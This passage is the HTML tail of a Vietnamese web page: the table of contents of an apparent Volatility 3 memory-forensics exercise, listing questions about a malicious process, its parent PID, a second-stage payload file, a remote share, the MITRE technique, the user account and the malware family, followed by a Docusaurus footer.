href="#️-công-cụ-sử-dụng" class="table-of-contents__link toc-highlight">🛠️ Công cụ sử dụng</a><ul><li><a href="#cách-volatility-3-xử-lý-bộ-nhớ" class="table-of-contents__link toc-highlight">Cách Volatility 3 xử lý bộ nhớ</a></li><li><a href="#cách-volatility-3-sử-dụng-plugins-để-phân-tách-dữ-liệu" class="table-of-contents__link toc-highlight">Cách Volatility 3 sử dụng Plugins để phân tách dữ liệu</a></li><li><a href="#-cheatsheet-có-thể-giúp-bạn-volatility-3" class="table-of-contents__link toc-highlight">📜 Cheatsheet có thể giúp bạn Volatility 3:</a></li></ul></li><li><a href="#-quá-trình-phân-tích" class="table-of-contents__link toc-highlight">🔬 Quá trình phân tích</a><ul><li><a href="#-câu-1-xác-định-tên-của-tiến-trình-độc-hại-giúp-hiểu-bản-chất-của-cuộc-tấn-công-tên-của-tiến-trình-độc-hại-là-gì" class="table-of-contents__link toc-highlight">🔍 Câu 1: Xác định tên của tiến trình độc hại giúp hiểu bản chất của cuộc tấn công. Tên của tiến trình độc hại là gì?</a></li><li><a href="#-câu-2-biết-id-tiến-trình-cha-ppid-của-tiến-trình-độc-hại-hỗ-trợ-theo-dõi-phân-cấp-tiến-trình-và-hiểu-được-luồng-tấn-công-pid-cha-của-tiến-trình-độc-hại-là-gì" class="table-of-contents__link toc-highlight">🔍 Câu 2: Biết ID tiến trình cha (PPID) của tiến trình độc hại hỗ trợ theo dõi, phân cấp tiến trình và hiểu được luồng tấn công. PID cha của tiến trình độc hại là gì?</a></li><li><a href="#-q3-tệp-tin-nào-được-sử-dụng-để-thực-thi-payload-giai-đoạn-hai" class="table-of-contents__link toc-highlight">🔍 Q3: Tệp tin nào được sử dụng để thực thi payload giai đoạn hai?</a></li><li><a href="#-q4-tên-thư-mục-chia-sẻ-được-truy-cập-trên-máy-chủ-từ-xa" class="table-of-contents__link toc-highlight">🔍 Q4: Tên thư mục chia sẻ được truy cập trên máy chủ từ xa?</a></li><li><a href="#-q5-mã-kỹ-thuật-mitre-attck-liên-quan-đến-phương-thức-thực-thi-này" class="table-of-contents__link toc-highlight">🔍 Q5: Mã kỹ thuật MITRE ATT&amp;CK liên quan đến phương thức thực thi này?</a></li><li><a href="#-q6-tên-người-dùng-mà-quá-trình-độc-hại-chạy-dưới-quyền-của-người-đó" class="table-of-contents__link toc-highlight">🔍 Q6: Tên người dùng mà quá trình độc hại chạy dưới quyền của người đó?</a></li><li><a href="#-q7-tên-của-malware-family" class="table-of-contents__link toc-highlight">🔍 Q7: Tên của malware family?</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">little Whale&#x27;s autobiography</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>